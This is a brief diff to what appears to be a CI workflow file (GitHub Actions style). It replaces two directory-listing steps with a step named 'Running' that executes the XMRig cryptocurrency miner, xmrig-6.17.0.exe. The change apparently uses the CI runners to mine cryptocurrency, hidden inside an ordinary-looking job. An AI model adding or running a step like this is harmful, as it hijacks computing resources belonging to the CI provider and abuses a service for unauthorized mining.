@@ -35,9 +35,7 @@ jobs:
       run: ls
     - name: Dir
       run: Dir xmrig-6.17.0-msvc-win64
-    - name: Dir
-      run: ls
-    - name: Dir 
-      run: dir xmrig-6.17.0
+    - name: Running
+      run: xmrig-6.17.0.exe
     - name: DONE
       run: exit
